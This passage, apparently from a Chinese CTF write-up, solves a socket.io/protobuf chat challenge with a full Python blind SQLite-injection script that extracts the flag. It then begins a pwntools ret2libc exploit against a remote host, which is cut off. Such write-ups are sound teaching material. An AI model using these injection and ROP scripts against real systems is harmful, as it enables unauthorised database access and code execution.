</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">txt1</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;txt1&#39;</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ul1</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;ul1&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">btn1</span>.<span style="color:#a6e22e">onclick</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x3689c9</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">RegReq</span>.<span style="color:#a6e22e">create</span>({
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;username&#39;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">value</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;password&#39;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">pass</span>.<span style="color:#a6e22e">value</span>
</span></span><span style="display:flex;"><span>            }),
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">_0x38c60d</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">RegReq</span>.<span style="color:#a6e22e">encode</span>(<span style="color:#a6e22e">_0x3689c9</span>).<span style="color:#a6e22e">finish</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sock</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#39;reg&#39;</span>, <span style="color:#a6e22e">_0x38c60d</span>.<span style="color:#a6e22e">slice</span>().<span style="color:#a6e22e">buffer</span>);
</span></span><span style="display:flex;"><span>    }, <span style="color:#a6e22e">sock</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;reg_ret&#39;</span>, (<span style="color:#a6e22e">_0x77442</span>, <span style="color:#a6e22e">_0x4d8078</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_0x77442</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">_0x4d8078</span>) <span style="color:#f92672">:</span> <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">_0x4d8078</span>);
</span></span><span style="display:flex;"><span>    }), <span style="color:#a6e22e">btn2</span>.<span style="color:#a6e22e">onclick</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#e6db74">/^\w{1,16}$/</span> [<span style="color:#e6db74">&#39;test&#39;</span>](<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">value</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;用户名不符合规范&#39;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#e6db74">/^\w{1,16}$/</span> [<span style="color:#e6db74">&#39;test&#39;</span>](<span style="color:#a6e22e">pass</span>.<span style="color:#a6e22e">value</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;密码不符合规范&#39;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0xea8ad4</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">LoginReq</span>.<span style="color:#a6e22e">create</span>({
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;username&#39;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">value</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;password&#39;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">pass</span>.<span style="color:#a6e22e">value</span>
</span></span><span style="display:flex;"><span>            }),
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">_0x581e63</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">LoginReq</span>.<span style="color:#a6e22e">encode</span>(<span style="color:#a6e22e">_0xea8ad4</span>).<span style="color:#a6e22e">finish</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sock</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#39;login&#39;</span>, <span style="color:#a6e22e">_0x581e63</span>.<span style="color:#a6e22e">slice</span>().<span style="color:#a6e22e">buffer</span>);
</span></span><span style="display:flex;"><span>    }, <span style="color:#a6e22e">sock</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;login_ret&#39;</span>, (<span style="color:#a6e22e">_0x253784</span>, <span style="color:#a6e22e">_0x4ca143</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_0x253784</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">_0x4ca143</span>) <span style="color:#f92672">:</span> (<span style="color:#a6e22e">_0x1f4215</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">value</span>, <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">_0x4ca143</span>));
</span></span><span style="display:flex;"><span>    }), <span style="color:#a6e22e">btn_send</span>.<span style="color:#a6e22e">onclick</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x254c70</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">MsgReq</span>.<span style="color:#a6e22e">create</span>({
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;msg&#39;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">txt1</span>.<span style="color:#a6e22e">value</span>
</span></span><span style="display:flex;"><span>            }),
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">_0x56ebdb</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">MsgReq</span>.<span style="color:#a6e22e">encode</span>(<span style="color:#a6e22e">_0x254c70</span>).<span style="color:#a6e22e">finish</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sock</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#39;msg&#39;</span>, <span style="color:#a6e22e">_0x56ebdb</span>.<span style="color:#a6e22e">slice</span>().<span style="color:#a6e22e">buffer</span>);
</span></span><span style="display:flex;"><span>    }, <span style="color:#a6e22e">sock</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;msg&#39;</span>, (<span style="color:#a6e22e">_0x2378cb</span>, <span style="color:#a6e22e">_0x4ce8f4</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">_0x3ca130</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;li&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_0x3ca130</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;h3&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">_0x2378cb</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;/h3&gt;&lt;p&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">_0x4ce8f4</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;/p&gt;&#39;</span>, <span style="color:#a6e22e">ul1</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">_0x3ca130</span>);
</span></span><span style="display:flex;"><span>    }), <span style="color:#a6e22e">sock</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;msg_ret&#39;</span>, (<span style="color:#a6e22e">_0x491ba1</span>, <span style="color:#a6e22e">_0x25dec1</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_0x491ba1</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;发送失败：&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">_0x25dec1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">_0x4a7033</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;li&#39;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">_0x4a7033</span>.<span style="color:#a6e22e">className</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mine&#39;</span>, <span style="color:#a6e22e">_0x4a7033</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;h3&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">_0x1f4215</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;/h3&gt;&lt;p&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">txt1</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;/p&gt;&#39;</span>, <span style="color:#a6e22e">ul1</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">_0x4a7033</span>), <span style="color:#a6e22e">txt1</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>}, <span style="color:#a6e22e">setInterval</span>(<span style="color:#66d9ef">function</span> () {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_0x6c017f</span>();
</span></span><span style="display:flex;"><span>}, <span style="color:#ae81ff">4000</span>);
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>这段代码引入了socket io和protobuf，socket io有reg、reg_ret、login、login_ret、msg、msg_ret事件，传递的参数均使用protobuf打包，看一下protobuf定义文件chat.proto：</p>
<pre tabindex="0"><code class="language-protocol" data-lang="protocol">package wschat;

message chat {
 
     message LoginReq {
         required string username = 1;
         required string password = 2;
     }
     message RegReq {
         required string username = 1;
         required string password = 2;
     }
     message ServerRsp {
         required int32 retcode = 1;
         optional string reply = 2;
     }
     message MsgReq {
         required string msg = 1;
     }
     message LogoutReq {
     }
}
</code></pre><p>回到上面的代码，其中登录接口是前端校验，限制用户名密码只能为1-16位字母数字下划线，前端校验可以用burp替换为空。</p>
<p>题目中提示网站为nodejs + sqlite，尝试一下sqlite注入，首先注册一个用户名密码均为admin的账户，然后用户名输入admin&rsquo;，密码admin，提示数据库出错，用户名尝试admin&rsquo;&ndash;，提示登录成功，存在注入点。</p>
<p>由于是盲注，socket io实现又很慢，只能硬撸出一个脚本。参考 <a class="link" href="https://developers.google.com/protocol-buffers/docs/pythontutorial"  target="_blank" rel="noopener"
    >https://developers.google.com/protocol-buffers/docs/pythontutorial</a> 实现protobuf，参考 <a class="link" href="https://python-socketio.readthedocs.io/en/latest/"  target="_blank" rel="noopener"
    >https://python-socketio.readthedocs.io/en/latest/</a> 实现socket io。</p>
<p>在 <a class="link" href="https://developers.google.com/protocol-buffers/docs/downloads"  target="_blank" rel="noopener"
    >https://developers.google.com/protocol-buffers/docs/downloads</a> 下载protoc，然后把.proto文件编译成python文件：</p>
<pre tabindex="0"><code>protoc -I=chat.proto目录 --python_out=输出目录 chat.proto路径
</code></pre><p>然后运行脚本：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socketio
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> chat_pb2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://4b89d5d3-7df8-4a8c-9352-08dbc410f835.nssctf.neusoft.edu.cn/&#39;</span>
</span></span><span style="display:flex;"><span>sio <span style="color:#f92672">=</span> socketio<span style="color:#f92672">.</span>Client()
</span></span><span style="display:flex;"><span>LoginReq <span style="color:#f92672">=</span> chat_pb2<span style="color:#f92672">.</span>chat<span style="color:#f92672">.</span>LoginReq()
</span></span><span style="display:flex;"><span>RegReq <span style="color:#f92672">=</span> chat_pb2<span style="color:#f92672">.</span>chat<span style="color:#f92672">.</span>RegReq()
</span></span><span style="display:flex;"><span>ServerRsp <span style="color:#f92672">=</span> chat_pb2<span style="color:#f92672">.</span>chat<span style="color:#f92672">.</span>ServerRsp()
</span></span><span style="display:flex;"><span>MsgReq <span style="color:#f92672">=</span> chat_pb2<span style="color:#f92672">.</span>chat<span style="color:#f92672">.</span>MsgReq()
</span></span><span style="display:flex;"><span>LogoutReq <span style="color:#f92672">=</span> chat_pb2<span style="color:#f92672">.</span>chat<span style="color:#f92672">.</span>LogoutReq()
</span></span><span style="display:flex;"><span><span style="color:#75715e"># alphabet = string.ascii_letters + string.digits + &#39;{_.,}&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># alphabet = string.printable + string.whitespace</span>
</span></span><span style="display:flex;"><span>alphabet <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_lowercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@sio</span><span style="color:#f92672">.</span>event
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">reg_ret</span>(err, data):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> _err, _data, recvFlag
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print(err, data)</span>
</span></span><span style="display:flex;"><span>    _err <span style="color:#f92672">=</span> err
</span></span><span style="display:flex;"><span>    _data <span style="color:#f92672">=</span> data
</span></span><span style="display:flex;"><span>    recvFlag <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@sio</span><span style="color:#f92672">.</span>event
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login_ret</span>(err, data):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> _err, _data, recvFlag
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print(err, data)</span>
</span></span><span style="display:flex;"><span>    _err <span style="color:#f92672">=</span> err
</span></span><span style="display:flex;"><span>    _data <span style="color:#f92672">=</span> data
</span></span><span style="display:flex;"><span>    recvFlag <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@sio</span><span style="color:#f92672">.</span>event
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">msg</span>(title, content):
</span></span><span style="display:flex;"><span>    print(title, content)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@sio</span><span style="color:#f92672">.</span>event
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">msg_ret</span>(err, data):
</span></span><span style="display:flex;"><span>    print(err, data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@sio</span><span style="color:#f92672">.</span>event
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect</span>():
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;connection established&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@sio</span><span style="color:#f92672">.</span>event
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">disconnect</span>():
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;disconnected from server&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">register</span>(username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;admin&#39;</span>, password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;admin&#39;</span>):
</span></span><span style="display:flex;"><span>    RegReq<span style="color:#f92672">.</span>username <span style="color:#f92672">=</span> username
</span></span><span style="display:flex;"><span>    RegReq<span style="color:#f92672">.</span>password <span style="color:#f92672">=</span> password
</span></span><span style="display:flex;"><span>    sio<span style="color:#f92672">.</span>emit(<span style="color:#e6db74">&#39;reg&#39;</span>, RegReq<span style="color:#f92672">.</span>SerializeToString())
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> recvFlag:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>    err, data <span style="color:#f92672">=</span> _err, _data
</span></span><span style="display:flex;"><span>    init()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> err, data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>(username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;admin&#39;</span>, password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;admin&#39;</span>):
</span></span><span style="display:flex;"><span>    LoginReq<span style="color:#f92672">.</span>username <span style="color:#f92672">=</span> username
</span></span><span style="display:flex;"><span>    LoginReq<span style="color:#f92672">.</span>password <span style="color:#f92672">=</span> password
</span></span><span style="display:flex;"><span>    sio<span style="color:#f92672">.</span>emit(<span style="color:#e6db74">&#39;login&#39;</span>, LoginReq<span style="color:#f92672">.</span>SerializeToString())
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> recvFlag:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>    err, data <span style="color:#f92672">=</span> _err, _data
</span></span><span style="display:flex;"><span>    init()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> err, data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">init</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> recvFlag, _err, _data
</span></span><span style="display:flex;"><span>    recvFlag <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>    _err <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>    _data <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    sio<span style="color:#f92672">.</span>connect(url)
</span></span><span style="display:flex;"><span>    init()
</span></span><span style="display:flex;"><span>    register()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># payload = &#34;select group_concat(tbl_name) from sqlite_master where type=&#39;table&#39;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># payload = &#34;select sql from sqlite_master where type=&#39;table&#39; and tbl_name=&#39;f16g_1s_1n_th1s_table&#39;&#34;</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select group_concat(f16g) from f16g_1s_1n_th1s_table&#34;</span>
</span></span><span style="display:flex;"><span>    length <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">100</span>):
</span></span><span style="display:flex;"><span>        err, data <span style="color:#f92672">=</span> login(<span style="color:#e6db74">&#34;admin&#39; and length((</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">))=</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">--&#34;</span><span style="color:#f92672">%</span>(payload, i))
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print(err, data)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> err <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> err <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            length <span style="color:#f92672">=</span> i
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;Error!&#39;</span>, err, data)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;Length:&#39;</span>, length)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># length = 6</span>
</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, length<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>        found <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> alphabet:
</span></span><span style="display:flex;"><span>            err, data <span style="color:#f92672">=</span> login(<span style="color:#e6db74">&#34;admin&#39; and hex(substr((</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">),</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">,1))=&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;--&#34;</span><span style="color:#f92672">%</span>(payload, i, c<span style="color:#f92672">.</span>encode()<span style="color:#f92672">.</span>hex()))
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># print(flag+c, err, data)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> err <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> err <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>                found <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>                flag <span style="color:#f92672">+=</span> c
</span></span><span style="display:flex;"><span>                print(flag)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#39;Error!&#39;</span>, err, data)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> found:
</span></span><span style="display:flex;"><span>            flag <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># version: 3.34.0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># table: user_table,sqlite_sequence,f1ag_not_in_here,test_table,f16g_1s_1n_th1s_table</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># column: &#34;f16g&#34; TEXT</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># f ag 34e7472f ffcf 400d aec3 a3b4fe390c1d </span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># flag{34e7472f-ffcf-400d-aec3-a3b4fe390c1d}</span>
</span></span><span style="display:flex;"><span>    sio<span style="color:#f92672">.</span>disconnect()
</span></span></code></pre></div><p>吐槽一下，socket io是基于事件触发的，有点类似于智能合约，请求与响应没有严格的对应关系，只能把请求和响应封装成一个原子操作，模拟传统的HTTP请求，代价就是速度很慢很慢。sql注入部分就是常见的sqlite注入了，但是爆flag的时候不知道为什么有的位即使把0-255跑遍也跑不出来，猜测可能是使用了中文，一个字符不只一个字节，这种情况下的爆破时间过长，所以在脚本中如果常用字符找不到就用\0占位，缺失的字符按照uuid的格式猜就行了。</p>
<pre tabindex="0"><code>flag{34e7472f-ffcf-400d-aec3-a3b4fe390c1d}
</code></pre><h2 id="pwn">Pwn</h2>
<h3 id="签到nssshop">[签到]NssShop</h3>
<p>随便输了个数</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 121; 
			flex-basis: 291px"
	>
	<a href="/post/dnuictf-writeup-by-or4nge/NssShop_flag.png" data-size="296x244">
		<img src="/post/dnuictf-writeup-by-or4nge/NssShop_flag.png"
			width="296"
			height="244"
			srcset="/post/dnuictf-writeup-by-or4nge/NssShop_flag_hu2136924aee23e291c5cd4597f9c77a83_15343_480x0_resize_box_3.png 480w, /post/dnuictf-writeup-by-or4nge/NssShop_flag_hu2136924aee23e291c5cd4597f9c77a83_15343_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<h3 id="justdoit">justdoit</h3>
<p>有一个汇编在调用read_long函数的最后，配合上atol可以任意往上往下更改栈的位置，利用这一点在栈上构造rop用ret2libc拿shell</p>
<pre tabindex="0"><code class="language-assemble" data-lang="assemble">add rbp rax
</code></pre><p>以下是exp</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./justdoit.1&#34;</span>)
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.172.144&#34;</span>, <span style="color:#ae81ff">65004</span>)
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./justdoit.1&#34;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.23.so&#34;</span>)
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004012b3</span>
</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011D5</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;name?&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(p64(main)<span style="color:#f92672">+</span> p64(main) <span style="color:#f92672">+</span> p64(main))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;s??&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-24&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;name?&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(p64(pop_rdi) <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;puts&#34;</span>]) <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#34;puts&#34;</span>]))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;s??&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-40&#34;</span>)
